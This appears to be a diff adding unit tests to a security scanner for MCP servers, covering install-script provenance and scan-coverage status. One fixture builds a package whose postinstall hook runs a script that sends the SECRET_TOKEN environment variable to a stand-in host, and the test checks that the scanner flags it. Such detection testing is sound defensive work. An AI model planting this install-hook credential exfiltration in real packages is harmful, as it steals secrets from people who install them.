@@ -364,6 +364,103 @@ class ScanPipelineTests(unittest.TestCase):
         )
         self.assertEqual(len(kept_unmapped), 2)
 
+    def test_install_script_provenance_handles_none_sink_span_safely(self) -> None:
+        from mcp_scanner.models import Finding, SourceSpan, make_finding_id, make_root_cause_group_id
+        from mcp_scanner.scanner import _attach_install_script_provenance
+
+        decl = SourceSpan("notice.js", 1, 1)
+        f_no_sink = Finding(
+            finding_id=make_finding_id("srv:1", "mcp-prompt-poisoning", None, decl),
+            root_cause_group_id=make_root_cause_group_id("srv:1", "tool:x", "prompt_injection", decl),
+            server_id="srv:1",
+            component="tool:x",
+            rule_id="mcp-prompt-poisoning",
+            rule_version="0.5",
+            detector="prompt_detector",
+            kind="semantic_indicator",
+            category="P",
+            severity="high",
+            evidence_strength="traced_or_grounded",
+            confidence=0.8,
+            mcp_surface="A4",
+            title="Prompt injection indicator",
+            reasoning="Declared description contains instruction override.",
+            remediation="Review description.",
+            declaration_span=decl,
+            sink_span=None,
+            evidence_sources=["prompt_detector"],
+        )
+        _attach_install_script_provenance(
+            [f_no_sink],
+            {
+                "notice.js": [
+                    {
+                        "manifest": "package.json",
+                        "hook": "postinstall",
+                        "symbol": "package.json#scripts.postinstall",
+                        "span": SourceSpan("package.json", 3, 1),
+                    }
+                ]
+            },
+        )
+        self.assertEqual(f_no_sink.evidence_sources, ["prompt_detector"])
+        self.assertEqual(f_no_sink.trace, [])
+
+    def test_dynamic_dispatch_boundary_and_unsupported_stmt_force_partial_coverage(self) -> None:
+        from unittest.mock import patch
+        from mcp_scanner.models import AnalysisBoundary
+
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "server.py").write_text("x = 1\n", encoding="utf-8")
+
+            # 1. dynamic_dispatch boundary forces scan_status=partial / exit_code=2 even if py status says complete
+            mock_py_dd = (
+                {
+                    "available": True,
+                    "status": "complete",
+                    "discovered_servers": [],
+                    "findings": [],
+                    "surfaces": {"tools": "scanned", "bootstrap": "scanned"},
+                    "analysis_boundaries": [
+                        AnalysisBoundary("dynamic_dispatch", "server.py", "Unresolved indirect call.")
+                    ],
+                    "diagnostics": [],
+                    "frameworks": [],
+                },
+                0.001,
+            )
+            with patch("mcp_scanner.scanner._invoke_python_ast", return_value=mock_py_dd):
+                rep_dd = run_scan(root, enable_semgrep=False, enable_python_ast=True)
+            self.assertEqual(rep_dd.scan_status, "partial")
+            self.assertEqual(rep_dd.policy_status, "not_evaluated")
+            self.assertEqual(rep_dd.exit_code, 2)
+            self.assertEqual(rep_dd.trust_score.score_scope, "provisional")
+            self.assertLessEqual(rep_dd.trust_score.displayed_score, 60)
+            self.assertEqual(rep_dd.coverage.surfaces["tools"], "partial")
+
+            # 2. external_lib boundary alone (e.g. inherited Pydantic BaseModel method) stays complete
+            mock_py_ext = (
+                {
+                    "available": True,
+                    "status": "complete",
+                    "discovered_servers": [],
+                    "findings": [],
+                    "surfaces": {"tools": "scanned", "bootstrap": "scanned"},
+                    "analysis_boundaries": [
+                        AnalysisBoundary("external_lib", "server.py", "Inherited external library method.")
+                    ],
+                    "diagnostics": [],
+                    "frameworks": [],
+                },
+                0.001,
+            )
+            with patch("mcp_scanner.scanner._invoke_python_ast", return_value=mock_py_ext):
+                rep_ext = run_scan(root, enable_semgrep=False, enable_python_ast=True)
+            self.assertEqual(rep_ext.scan_status, "complete")
+            self.assertEqual(rep_ext.policy_status, "pass")
+            self.assertEqual(rep_ext.exit_code, 0)
+
 
 @unittest.skipUnless(SEMGREP, "set MCP_SCANNER_TEST_SEMGREP to run real Semgrep pipeline tests")
 class RealSemgrepPipelineTests(unittest.TestCase):
@@ -417,3 +514,61 @@ class RealSemgrepPipelineTests(unittest.TestCase):
         self.assertEqual(report.exit_code, 2)
         self.assertEqual(report.trust_score.score_scope, "provisional")
         self.assertEqual(report.coverage.surfaces["js_ts_code"], "unmeasured_no_rules")
+
+    def test_postinstall_script_literal_comment_and_unrelated_apis_are_clean_while_taint_links_provenance(
+        self,
+    ) -> None:
+        # 1. Negative: postinstall invokes notice.js with /dev/tcp/ literal, comment, and unrelated env + fetch
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"name": "benign-notice", "scripts": {"postinstall": "node notice.js"}}\n',
+                encoding="utf-8",
+            )
+            (root / "notice.js").write_text(
+                "// Docs mention /dev/tcp/ and process.env.API_TOKEN\n"
+                "console.log('Networking guide: /dev/tcp/ example');\n"
+                "function getCfg() { return process.env.APP_MODE; }\n"
+                "async function checkStatus() { return fetch('https://example.com/health'); }\n",
+                encoding="utf-8",
+            )
+            clean_rep = run_scan(
+                root,
+                rules=[PY_RULES, JS_TS_RULES],
+                semgrep=SEMGREP,
+                windows_temp=Path(WINDOWS_TEMP) if WINDOWS_TEMP else None,
+            )
+
+        self.assertEqual(clean_rep.scan_status, "complete", clean_rep.diagnostics)
+        self.assertEqual(clean_rep.policy_status, "pass")
+        self.assertEqual(clean_rep.exit_code, 0)
+        self.assertEqual(clean_rep.findings, [])
+
+        # 2. Positive: postinstall invokes exfil.js with REAL taint flow -> confirmed by Semgrep + linked to postinstall
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"name": "tainted-install", "scripts": {"postinstall": "node exfil.js"}}\n',
+                encoding="utf-8",
+            )
+            (root / "exfil.js").write_text(
+                "const token = process.env.SECRET_TOKEN;\n"
+                "fetch('https://example.invalid/collect', { method: 'POST', body: token });\n",
+                encoding="utf-8",
+            )
+            hit_rep = run_scan(
+                root,
+                rules=[PY_RULES, JS_TS_RULES],
+                semgrep=SEMGREP,
+                windows_temp=Path(WINDOWS_TEMP) if WINDOWS_TEMP else None,
+            )
+
+        self.assertEqual(hit_rep.scan_status, "complete", hit_rep.diagnostics)
+        self.assertEqual(hit_rep.policy_status, "fail")
+        self.assertEqual(hit_rep.exit_code, 1)
+        env_findings = [f for f in hit_rep.findings if f.rule_id == "mcp-js-env-to-network"]
+        self.assertEqual(len(env_findings), 1)
+        self.assertIn("package_json_analyzer", env_findings[0].evidence_sources)
+        self.assertEqual(env_findings[0].trace[0].symbol, "package.json#scripts.postinstall")
+        self.assertEqual(env_findings[0].trace[0].edge_kind, "possible")
+        self.assertIn("file-level provenance", env_findings[0].trace[0].note or "")
